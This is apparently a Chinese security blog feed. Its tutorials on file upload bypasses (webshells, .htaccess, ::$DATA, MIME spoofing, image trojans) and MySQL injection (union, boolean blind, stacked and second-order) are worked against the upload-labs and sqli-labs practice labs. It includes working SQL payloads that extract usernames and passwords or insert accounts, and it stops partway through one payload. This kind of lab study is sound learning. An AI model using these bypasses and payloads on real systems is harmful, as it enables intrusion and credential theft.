        <content type="html"><![CDATA[<h1 id="什么是文件上传漏洞"><a href="#什么是文件上传漏洞" class="headerlink" title="什么是文件上传漏洞"></a>什么是文件上传漏洞</h1><ul><li>文件上传漏洞是web系统中常见的一种功能，通过文件上传能实现上传图片、视频，以及其他类型的文件，但是随着web中包含的功能越来越多，潜在的网络安全风险也就越大。</li><li>如果恶意用户上传了可执行的文件或者脚本，就会导致网站被其控制甚至会使其服务器沦陷，以至于引发恶意的网络安全事件。</li></ul><h1 id="文件上传漏洞原理"><a href="#文件上传漏洞原理" class="headerlink" title="文件上传漏洞原理"></a>文件上传漏洞原理</h1><ul><li>文件上传漏洞是指用户通过界面上的上传功能上传了一个可执行的脚本文件，而WEB端的系统并未对其进行检测或者检测的逻辑做的不够好。</li><li>通常来说文件上传功能是没有问题的，主要是服务器如何对上传的文件如何进行处理。</li><li>若WEB未对用户上传的文件进行有效的审查，若存在恶意用户对其上传一句话木马，从而实现控制WEB网站的目的。</li></ul><h1 id="什么是webshell"><a href="#什么是webshell" class="headerlink" title="什么是webshell"></a>什么是webshell</h1><ul><li>Webshell是一种网页后门，通常用asp、jsp或者php编写。</li><li>WebShell的常见的功能有执行系统命令、窃取用户数据、删除web页面、修改主页等。黑客在入侵了一个网站后，常常在将这些asp或php木马后门文件放置在网站服务器的web目录中，与正常的网页文件混在一起。</li></ul><h2 id="Webshell的分类"><a href="#Webshell的分类" class="headerlink" title="Webshell的分类"></a>Webshell的分类</h2><table><thead><tr><th><strong>分类</strong></th><th><strong>体量</strong></th><th><strong>特点</strong></th></tr></thead><tbody><tr><td>大马</td><td>体积大，包含很多功能</td><td>通常会包含调用系统的关键函数，所以通常会加密代码用来隐藏。</td></tr><tr><td>小马</td><td>体积小，通常只包含文件上传功能</td><td>同上</td></tr><tr><td>一句话木马</td><td>代码极短（只有一行）</td><td>使用方便，可以单独作为一个文件，也可以插入其他正常文件中；变形多，难以查杀。</td></tr></tbody></table><h1 id="文件上传实战思路"><a href="#文件上传实战思路" class="headerlink" title="文件上传实战思路"></a>文件上传实战思路</h1><ul><li>文件上传和文件执行是两个东西</li><li>漏洞分类：解析漏洞、cms漏洞、其他漏洞（编辑器漏洞、cve漏洞、安全修复）</li><li>思路：如果有一个网站，要从文件上传的方向开始</li><li>第一步：先看中间件，看是否存在解析漏洞&#x2F;CMS&#x2F;编辑器漏洞&#x2F;CVE&#x2F;</li><li>如果有，如何找：</li><li>字典扫描：扫描会员中心，文件上传的位置</li><li>找到后，如何利用：</li><li>验证&#x2F;绕过</li></ul><h1 id="文件上传绕过分类"><a href="#文件上传绕过分类" class="headerlink" title="文件上传绕过分类"></a>文件上传绕过分类</h1><h2 id="JS类防护"><a href="#JS类防护" class="headerlink" title="JS类防护"></a>JS类防护</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><ul><li>JS防护就是将上传的文件进行一个格式的验证，但是JS类的防护是用户可以控制的，所有前端的所有验证都是不安全的。</li></ul><h3 id="实例upload-labs-Pass01"><a href="#实例upload-labs-Pass01" class="headerlink" title="实例upload-labs-Pass01"></a>实例upload-labs-Pass01</h3><ul><li>通过禁用界面JS处理，可以禁用JS防护</li><li>在火狐安装插件javascript switcher，可以一键禁用JS处理<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231008225253.png" alt="image.png"></li><li>在upload下就可以看到我们上传的文件<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231008225334.png" alt="image.png"></li></ul><h2 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h2><ul><li>黑名单就是服务端明确不让上传的格式后缀，例如：rar、php、zip等。</li></ul><h3 id="特殊解析后缀"><a href="#特殊解析后缀" class="headerlink" title="特殊解析后缀"></a>特殊解析后缀</h3><h4 id="基本概念-1"><a href="#基本概念-1" class="headerlink" title="基本概念"></a>基本概念</h4><ul><li>特殊解析后缀绕过是由于黑名单过滤规则不严谨，在某些特定的情况下的后缀也能够被当作php文件进行解析，例如PHP2、php3、php4、phtml、pht等情况。</li><li>可以使用phtml、php3、php4、php5，当然前提是apache服务器，同时在配置文件夹中需要有将AddType application&#x2F;x-httpd-php .php .phtml .phps .php1 .php4 .pht 这样的一段话前面的注释删除，重启phpstudy让其生效。</li></ul><h4 id="实例upload-labs-Pass03"><a href="#实例upload-labs-Pass03" class="headerlink" title="实例upload-labs-Pass03"></a>实例upload-labs-Pass03</h4><ul><li>禁止<code>.asp</code>、<code>.aspx</code>、<code>.php</code>、<code>.jsp</code>类型进行上传</li><li>将php文件后缀改为phtml进行绕过，实现文件上传<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231008230836.png" alt="image.png"></li></ul><h3 id="htaccess解析"><a href="#htaccess解析" class="headerlink" title=".htaccess解析"></a>.htaccess解析</h3><h4 id="基本概念-2"><a href="#基本概念-2" class="headerlink" title="基本概念"></a>基本概念</h4><ul><li>.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置</li><li>通过htaccess文件，可以实现:网页301重定向、自定义404页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</li></ul><h4 id="实例upload-labs-Pass04"><a href="#实例upload-labs-Pass04" class="headerlink" title="实例upload-labs-Pass04"></a>实例upload-labs-Pass04</h4><ul><li>通过源码得知第三关使用的phtml被限制了，并且设定了更多的特殊解析后缀，所以使用特殊解析后缀已经无法绕过了<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231008231355.png" alt="image.png"></li><li>这里就可以使用到<code> .htaccess</code>进行绕过测试。</li><li>创建一个 <code>.htaccess</code>文件，使用notepad++编辑<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231008232814.png" alt="image.png"></li><li>然后将<code>.htaccess</code>文件上传，再将php文件改为<code>.jpg</code>文件上传<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009104431.png" alt="image.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009104445.png" alt="image.png"></li><li>可以看到已经成功上传文件了<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009104909.png" alt="image.png"></li></ul><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><h4 id="基本概念-3"><a href="#基本概念-3" class="headerlink" title="基本概念"></a>基本概念</h4><ul><li>后缀大小写是通过服务端未将后缀进行统一的格式转换，导致可以上传PHP的文件，同时由于Windows系统对后缀大小写并不敏感，所以当在写PHP的改成Php就会被当作PHP进行解析。</li></ul><h4 id="实例upload-labs-Pass05"><a href="#实例upload-labs-Pass05" class="headerlink" title="实例upload-labs-Pass05"></a>实例upload-labs-Pass05</h4><ul><li>通过源码可知，其未对大小写进行限制，我们可以对php后缀进行大小写变形<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009105223.png" alt="image.png"></li><li>上传文件<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009105402.png" alt="image.png"></li></ul><h3 id="点绕过"><a href="#点绕过" class="headerlink" title="点绕过"></a>点绕过</h3><h4 id="基本概念-4"><a href="#基本概念-4" class="headerlink" title="基本概念"></a>基本概念</h4><ul><li>点绕过其实就是利用了Windows对文件和文件名的限制，当将点放在结尾的时候，就会触发操作系统的命名规范问题，所以在生成文件的时候，添加在结尾的点就会被去除。</li></ul><h4 id="实例upload-labs-Pass07"><a href="#实例upload-labs-Pass07" class="headerlink" title="实例upload-labs-Pass07"></a>实例upload-labs-Pass07</h4><ul><li>通过源码发现，本关并未对结尾点进行检测。</li><li>那么这里就可以通过在后缀加上点进行绕过，触发操作系统的命名规范，就会将结尾的点去除<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009111050.png" alt="image.png"></li><li>burp抓包在结尾加个点就可以绕过<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009111203.png" alt="image.png"></li><li>可以看见成功上传了<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009111305.png" alt="image.png"></li></ul><h4 id="实例upload-labs-Pass09"><a href="#实例upload-labs-Pass09" class="headerlink" title="实例upload-labs-Pass09"></a>实例upload-labs-Pass09</h4><ul><li>通过源码发现，加一个点会被过滤</li><li>但是只是过滤一次，所有可以加两个点<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009111429.png" alt="image.png"></li><li>只需要与Pass07相同的方法，结尾加两个点即可</li></ul><h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><h4 id="基本概念-5"><a href="#基本概念-5" class="headerlink" title="基本概念"></a>基本概念</h4><ul><li>其实空格绕过和点绕过是一样的，都是利用操作系统的特性来进行解析绕过。</li></ul><h4 id="实例upload-labs-Pass06"><a href="#实例upload-labs-Pass06" class="headerlink" title="实例upload-labs-Pass06"></a>实例upload-labs-Pass06</h4><ul><li>通过源码发现，没有对结尾空格进行限制，所有我们可以在结尾加空格进行绕过<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009111938.png" alt="image.png"></li><li>成功绕过<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009112000.png" alt="image.png"></li></ul><h3 id="DATA绕过"><a href="#DATA绕过" class="headerlink" title="::$DATA绕过"></a>::$DATA绕过</h3><h4 id="基本概念-6"><a href="#基本概念-6" class="headerlink" title="基本概念"></a>基本概念</h4><ul><li>在window的时候如果文件名+<code>::$DATA</code>会把<code>::$DATA</code>之后的数据当成文件流处理,不会检测后缀名，且保持<code>::$DATA</code>之前的文件名，他的目的就是不检查后缀名</li></ul><h4 id="实例upload-labs-Pass08"><a href="#实例upload-labs-Pass08" class="headerlink" title="实例upload-labs-Pass08"></a>实例upload-labs-Pass08</h4><ul><li>通过源码可知，没有为<code>::$DATA</code>的检测<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009112905.png" alt="image.png"></li><li>在文件结尾加<code>::$DATA</code>就可以绕过<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009113123.png" alt="image.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009113158.png" alt="image.png"></li></ul><h3 id="双后缀名绕过"><a href="#双后缀名绕过" class="headerlink" title="双后缀名绕过"></a>双后缀名绕过</h3><h4 id="基本概念-7"><a href="#基本概念-7" class="headerlink" title="基本概念"></a>基本概念</h4><ul><li>服务端可能存在将后缀替换为空的情况，但是这就存在一种可能就是在编辑过滤的时候只过滤了一次，所以就出现了可以通过双写就绕过的可能。</li></ul><h4 id="实例upload-labs-Pass10"><a href="#实例upload-labs-Pass10" class="headerlink" title="实例upload-labs-Pass10"></a>实例upload-labs-Pass10</h4><ul><li>通过源码可以知道，上传指定的文件后缀，会被替换成空，但是只替换一次<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009150200.png" alt="image.png"></li><li>那么就可以通过双后缀的方式绕过</li><li>由于过滤是从左往右，例如p<strong>php</strong>hp会被过滤成php<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009150658.png" alt="image.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009150752.png" alt="image.png"></li></ul><h2 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h2><ul><li>白名单就是服务端明确可以上传的格式后缀，例如：jpg、png、jpeg等。</li></ul><h3 id="MIME绕过"><a href="#MIME绕过" class="headerlink" title="MIME绕过"></a>MIME绕过</h3><h4 id="基本概念-8"><a href="#基本概念-8" class="headerlink" title="基本概念"></a>基本概念</h4><ul><li>服务端MIME类型检测是通过检查http中包含的Content-Type字段中的值来判断上传文件是否合法的。</li><li>利用Burp抓包，将报文中的Content-Type改成允许的类型<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: image/gif（gif图像）</span><br><span class="line">Content-Type: image/jpg（jpg图像）</span><br><span class="line">Content-Type: image/png（png图像）</span><br></pre></td></tr></table></figure></li></ul><h4 id="实例upload-labs-Pass02"><a href="#实例upload-labs-Pass02" class="headerlink" title="实例upload-labs-Pass02"></a>实例upload-labs-Pass02</h4><ul><li>通过源码可知，采用了<code>content-type</code>进行后端验证<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009151320.png" alt="image.png"></li><li>我们可以通过burp抓包对其<code>content-type</code>进行修改<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009152042.png" alt="image.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009152057.png" alt="image.png"></li></ul><h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><h4 id="基本概念-9"><a href="#基本概念-9" class="headerlink" title="基本概念"></a>基本概念</h4><ul><li>%00不是代表空格，而是null，一个空字符，当程序执行到%00后，那么后面的数据就会停止，意思就是误当作结束符，把后面的数据直接忽略了，这就会导致漏洞产生。</li><li>在文件上传后，利用%00截断，在文件扩展名验证的时候，就会取文件的扩展名进行验证，但是在最后保存在本地的时候，%00就会截断文件名，只保存%00之前的内容。</li><li>%00只能用于php版本低于5.3的。这里我们需要把phpstudy切换一下版本,把magic_quotes_gpc关闭，以phpstudy为例。其他选项菜单—php扩展及设置—参数开关设置—把magic_quotes_gpc关闭。</li></ul><h2 id="内容及其他"><a href="#内容及其他" class="headerlink" title="内容及其他"></a>内容及其他</h2><h3 id="文件头检测"><a href="#文件头检测" class="headerlink" title="文件头检测"></a>文件头检测</h3><h4 id="基本概念-10"><a href="#基本概念-10" class="headerlink" title="基本概念"></a>基本概念</h4><ul><li>图片的格式在防护中通常是不会使用后缀进行判断的依据，文件头是文件开头的一段二进制码，不同类型的图片也就会有不同的二进制头。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">JPEG (jpg)，文件头：FF D8 FF E1  </span><br><span class="line">PNG (png)，文件头：89 50 4E 47  </span><br><span class="line">GIF (gif)，文件头：47 49 46 38</span><br></pre></td></tr></table></figure><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009153123.png" alt="image.png"></li></ul><h4 id="实例upload-labs-Pass13"><a href="#实例upload-labs-Pass13" class="headerlink" title="实例upload-labs-Pass13"></a>实例upload-labs-Pass13</h4><ul><li>制作木马图</li><li>在创建一个图片，和php文件，使用指令<code>copy 1.png/b + p13.php/a 2.png</code>进行合并<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009153856.png" alt="image.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009153909.png" alt="image.png"></li><li>上传合并后的图片，这个图片当中就包含了php语句<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009153956.png" alt="image.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009155428.png" alt="image.png"></li></ul><h3 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h3><h4 id="基本概念-11"><a href="#基本概念-11" class="headerlink" title="基本概念"></a>基本概念</h4><ul><li>二次渲染就是在我们上传的图片后，网站会对图片进行二次处理，比如对图片的尺寸、格式、以及网站对图片进行定义的一些要求等进行处理，并且服务器会对里面的内容进行二次替换更新，在处理完后，会生成一个合规的图片在网站上显示出来。</li></ul><h4 id="实例upload-labs-Pass16"><a href="#实例upload-labs-Pass16" class="headerlink" title="实例upload-labs-Pass16"></a>实例upload-labs-Pass16</h4><ul><li>通过源码可知，会重新渲染图片，就是说我们上传的图片不会被保存，而是只有图片信息被提取</li><li>准备一个gif图片（最好是，因为比较容易），制作成图片马<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009220037.png" alt="image.png"></li><li>上传图片马<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009220114.png" alt="image.png"></li><li>将上传的图片马与后台保存的进行对比</li><li>使用<strong>Beyond Compare 4</strong>工具对比<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009220244.png" alt="image.png"></li><li>发现图片文件前面大部分二次渲染的时候被过滤了，所以我们可以将php语句放在前部分，这样就不会被过滤了，然后保存<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009220427.png" alt="image.png"></li><li>然后再将该文件进行上传<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009220523.png" alt="image.png"></li><li>然后再次对比我们会发现，插入的php语句没有被过滤<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231009220856.png" alt="image.png"></li></ul><h3 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h3><h4 id="基本概念-12"><a href="#基本概念-12" class="headerlink" title="基本概念"></a>基本概念</h4><ul><li>条件竞争就是在源代码中是存在校验的，但是校验是在文件上传后，才开始校验，也就是文件先上传至服务器中，然后服务器会对该文件进行校验，当符合的时候则会对文件进行重命名，当文件不符合要求的时候就对将文件进行删除。</li><li>而我们则需要在服务器对文件删除前进行访问，由于文件在访问过程中，服务器是无法删除的，所以就可以利用这个节点实现条件竞争。</li></ul><h3 id="突破getimagesize函数"><a href="#突破getimagesize函数" class="headerlink" title="突破getimagesize函数"></a>突破getimagesize函数</h3><h4 id="基本概念-13"><a href="#基本概念-13" class="headerlink" title="基本概念"></a>基本概念</h4><ul><li><code>getimagesize</code>函数是用于获取图像大小及相关信息，成功返回一个数组，失败则返回false产生一条e_warning级的错误信息。</li><li>通过对图片及代码进行合成图片马，这个时候<code>getimagesize</code>函数既可以获取图片信息，文件后缀php也能够被解析成脚本文件，从而绕过<code>getimagesize</code>函数的限制。</li></ul><h4 id="实例upload-labs-Pass14"><a href="#实例upload-labs-Pass14" class="headerlink" title="实例upload-labs-Pass14"></a>实例upload-labs-Pass14</h4><ul><li>本关存有getimagesize函数，这个函数的意思是：会对目标文件的16进制去进行一个读取，去读取头几个字符串是不是符合图片的要求的。</li><li>使用办法和第十三关是一样的，前提都是需要存在相关的漏洞。</li></ul><h3 id="突破exit-imagetype-函数"><a href="#突破exit-imagetype-函数" class="headerlink" title="突破exit_imagetype()函数"></a>突破exit_imagetype()函数</h3><h4 id="基本概念-14"><a href="#基本概念-14" class="headerlink" title="基本概念"></a>基本概念</h4><ul><li>服务器exit_imagetype()函数检测上传图片类型是否为白名单图片格式来验证上传文件合法性。可以通过制作图片马绕过，再配合文件包含漏洞解析文件来获取服务器配置信息。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> web安全 </tag>
            
            <tag> 文件上传漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql注入的注入类型（2）</title>
      <link href="/2023/09/22/Mysql%E6%B3%A8%E5%85%A5%E7%9A%84%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%EF%BC%882%EF%BC%89/"/>
      <url>/2023/09/22/Mysql%E6%B3%A8%E5%85%A5%E7%9A%84%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%EF%BC%882%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="加解密注入"><a href="#加解密注入" class="headerlink" title="加解密注入"></a>加解密注入</h1><ul><li>数据包当中的cookie内容经过了加密，可以将sql语句进行加密，然后注入</li><li>以sqli-labs-less21为例<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230922225650.png" alt="image.png"></li><li>在用户名密码栏当中输入admin<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230922225719.png" alt="image.png"></li><li>会回显我们的cookie数据<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230922225935.png" alt="image.png"></li><li>通过抓包工具可以看到cookie数据内容被加密了，加密方式为base64编码<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230922230631.png" alt="image.png"></li><li>解密得到admin原文，我们在后面加个单引号测试是否存在漏洞<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230922230916.png" alt="image.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230922230938.png" alt="image.png"></li><li>可以看出，我们可以在后面加上单引号和后括号进行注入<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230922231807.png" alt="image.png"></li><li>将报错注入到cookie当中，然后进行加密<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230922231847.png" alt="image.png"></li><li>可以看到注入成功了</li></ul><h1 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h1><ul><li>二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入。</li><li>二次注入是sql注入的一种，但是比普通sql注入利用更加困难，利用门槛更高。普通注入数据直接进入到 SQL 查询中，而二次注入则是输入数据经处理后存储，取出后，再次进入到 SQL 查询。</li></ul><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ul><li>在第一次进行数据库插入数据的时候，使用了<code>get_magic_quotes_gpc</code>对其中的特殊字符进行了转义，但是存入数据库时还是原来的数据，数据中带有<code>&#39;</code>或者<code>#</code>，然后下次使用再拼凑sql语句中，形成二次注入</li></ul><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><ul><li>以sqli-labs-less24为例<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230922232516.png" alt="image.png"></li><li>我们没有用户名和密码，所有我们通过注册账户的方式，将干扰符号注入进去</li><li>我们猜测存在admin用户，所有我们注册admin’#<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230922232641.png" alt="image.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230922232655.png" alt="image.png"></li><li>通过查询可以知道我们的账户注册成功了<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230922232832.png" alt="image.png"></li><li>成功登录之后，进入到更改密码的界面，我们直接将密码改为<code>111111</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230922232929.png" alt="image.png"></li><li>此时我们发现，我们将<code>admin</code>的密码改了，说明二次注入成功</li><li>原因时代码在执行的过程中，将<code>&#39;#</code>进行了转义，没有对注册造成干扰，但是在第二次调用的时候没有进行过滤，造成二次注入。</li></ul><h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><ul><li>堆叠查询可以执行多条语句，多条语句之间以分号隔开。</li><li>堆叠注入就是利用在一条查询语句结束之后，在语句末尾加入分号之后再插入恶意的SQL语句，就可以达到攻击者的意图。</li></ul><h2 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h2><ul><li>以sqli-labs-less38为例</li><li>在语句中加个分号<code>;</code>，在后面加入需要注入的恶意语句</li><li><code>?id=1&#39;; insert into users(id,username,password) values (38,&#39;less38&#39;,&#39;mima&#39;)--+</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230922234158.png" alt="image.png"></li><li>用于在数据库当中插入自定义的用户名和密码<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230922234356.png" alt="image.png"></li><li>可以看到已经注入成功了</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> web安全 </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> MYSQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql注入的注入类型</title>
      <link href="/2023/09/21/Mysql%E6%B3%A8%E5%85%A5%E7%9A%84%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B/"/>
      <url>/2023/09/21/Mysql%E6%B3%A8%E5%85%A5%E7%9A%84%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="union联合注入"><a href="#union联合注入" class="headerlink" title="union联合注入"></a>union联合注入</h1><ul><li>联合注入，就是使用联合查询进行注入的一种方式，是一种高效的注入的方式，适用于<strong>有回显</strong>同时数据库软件版本是5.0以上的MYSQL数据库。至于为什么需要版本是5.0以上的MYSQL数据库，是因为MYSQL会有一个系统数据库<code>information_schema</code>，能很快的通过几条注入语句获取到想要的数据。</li></ul><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><ul><li>以sqli-labs-less-1为例</li></ul><h3 id="查询表格的列数"><a href="#查询表格的列数" class="headerlink" title="查询表格的列数"></a>查询表格的列数</h3><ul><li><code>?id=2&#39; order by 3 --+</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921224117.png" alt="image.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921224138.png" alt="image.png"></li><li>可以看出共有4列</li></ul><h3 id="爆出显示位"><a href="#爆出显示位" class="headerlink" title="爆出显示位"></a>爆出显示位</h3><ul><li><code>?id=-1&#39;union select 1,2,3 --+</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921224250.png" alt="image.png"></li></ul><h3 id="获取当前数据库的数据库名和版本号"><a href="#获取当前数据库的数据库名和版本号" class="headerlink" title="获取当前数据库的数据库名和版本号"></a>获取当前数据库的数据库名和版本号</h3><ul><li><code>?id=-1&#39;union select 1,database(),version() --+</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921224411.png" alt="image.png"></li></ul><h3 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h3><ul><li><code>?id=-1&#39;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39; --+</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921225123.png" alt="image.png"></li></ul><h3 id="获取字段名"><a href="#获取字段名" class="headerlink" title="获取字段名"></a>获取字段名</h3><ul><li>?id&#x3D;-1’union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’ –+<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921225240.png" alt="image.png"></li></ul><h3 id="获取用户名和密码"><a href="#获取用户名和密码" class="headerlink" title="获取用户名和密码"></a>获取用户名和密码</h3><ul><li><code>?id=-1&#39;union select 1,2,group_concat(username,password) from users --+</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921225339.png" alt="image.png"></li></ul><h1 id="布尔注入"><a href="#布尔注入" class="headerlink" title="布尔注入"></a>布尔注入</h1><ul><li>如果没有回显，我们就不能使用联合注入了</li><li>这个时候可以选择布尔注入</li><li>布尔盲注主要用到<code>length()</code>,<code>ascii()</code> ,<code>substr()</code>这三个函数，首先通过<code>length()</code>函数确定长度再通过另外两个确定具体字符是什么。布尔盲注向对于联合注入来说<strong>需要花费大量时间</strong>。</li></ul><h2 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h2><ul><li>以sqli-labs-less-5 为例</li></ul><h3 id="数据库名长度"><a href="#数据库名长度" class="headerlink" title="数据库名长度"></a>数据库名长度</h3><ul><li><code>?id=1&#39; and length((select database()))&gt;9--+</code>发现没有反应，表示长度小于或等于9<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921230047.png" alt="image.png"></li><li><code>?id=1&#39; and length((select database()))=8--+</code>当等于8时，有通过反馈，表示数据库名长度为8<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921230206.png" alt="image.png"></li></ul><h3 id="数据库名"><a href="#数据库名" class="headerlink" title="数据库名"></a>数据库名</h3><ul><li><code>?id=1&#39;and ascii(substr((select database()),1,1))=115--+</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921230349.png" alt="image.png"></li><li><code>substr(a,b,c)</code>a表示截取的字符串，b表示截取的位置，c表示截取的长度</li><li>一次截取一个字符进行查询，上面截图查询出第一个字符等于115，通过ASCII码可知为<code>s</code></li><li>通过这个方法查出全部八个字符</li><li>Ps:这个方法真的好麻烦哦</li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li>剩下的操作基本上差不多，可以参考下面的内容<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27;and length((select database()))&gt;9--+</span></span><br><span class="line"><span class="string">#大于号可以换成小于号或者等于号，主要是判断数据库的长度。lenfth()是获取当前数据库名的长度。如果数据库是haha那么length()就是4</span></span><br><span class="line"><span class="string">?id=1&#x27;</span>and ascii(substr((select database()),1,1))=115--+</span><br><span class="line"><span class="comment">#substr(&quot;78909&quot;,1,1)=7 substr(a,b,c)a是要截取的字符串，b是截取的位置，c是截取的长度。布尔盲注我们都是长度为1因为我们要一个个判断字符。ascii()是将截取的字符转换成对应的ascii吗，这样我们可以很好确定数字根据数字找到对应的字符。</span></span><br><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27;and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13--+</span></span><br><span class="line"><span class="string">#判断所有表名字符长度。</span></span><br><span class="line"><span class="string">?id=1&#x27;</span>and ascii(substr((select group_concat(table_name) from information_schema.tables where 